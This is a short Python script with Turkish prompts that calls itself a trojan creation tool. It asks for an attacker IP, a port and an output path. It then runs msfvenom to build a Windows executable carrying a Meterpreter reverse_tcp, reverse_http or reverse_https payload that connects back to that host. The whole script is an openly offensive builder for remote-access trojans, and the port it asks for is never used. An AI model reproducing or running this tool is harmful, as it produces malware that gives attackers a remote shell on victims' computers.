#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet TROJAN OLUSTURMA")

print("""
Trojan Olusturma Aracina Hosgeldiniz

""")

ip = raw_input("Local veya Dis IP Girin: ")
port = raw_input ("Port Girin: ")
print("""

1)windows/meterpreter/reverse_tcp
2)windows/meterpreter/reverse_http
3)windows/meterpreter/reverse_https

""")
payload = raw_input ("payload No Girin: ")
kayityeri = raw_input ("Kayit yeri girin: ")

if(payload=="1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " -f exe -o " + kayityeri)
if(payload=="2"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " -f exe -o " + kayityeri)
if(payload=="3"):
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " -f exe -o " + kayityeri)	
	

